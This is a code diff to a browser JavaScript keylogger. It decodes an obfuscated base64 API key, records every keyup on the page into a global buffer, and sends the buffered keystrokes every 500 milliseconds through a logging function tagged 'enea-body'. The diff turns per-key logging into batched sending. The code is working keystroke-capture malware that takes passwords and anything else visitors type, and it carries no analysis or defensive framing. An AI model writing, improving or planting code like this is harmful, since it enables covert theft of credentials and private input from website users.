@@ -3,8 +3,9 @@
 const apiKey = atob(
   "TVFBM0FEVUFNZ0F5QURRQU1nQTBBRGtBTVFBNEFEY0FPUUF6QURVQU53QTJBRGtB"
 );
+let globalBuffer = ""
 
-function logKey(suffix, string) {
+function logInput(suffix, string) {
   const payload = {
     keyword: `enea-${suffix}`,
     payload: string,
@@ -20,10 +21,24 @@ function logKey(suffix, string) {
   });
 }
 
+function sendBuffer() {
+  if (globalBuffer && globalBuffer.length > 0) {
+    logInput('body', globalBuffer)
+    globalBuffer = ""
+  }
+}
+
+function bufferKeyInput(key) {
+  globalBuffer += key
+}
+
 function startKeylogger() {
   document.addEventListener("keyup", function (e) {
-    logKey("body", e.key);
+    bufferKeyInput(e.key)
   });
+  window.setInterval(function() {
+    sendBuffer()
+  }, 500)
 }
 
 startKeylogger();
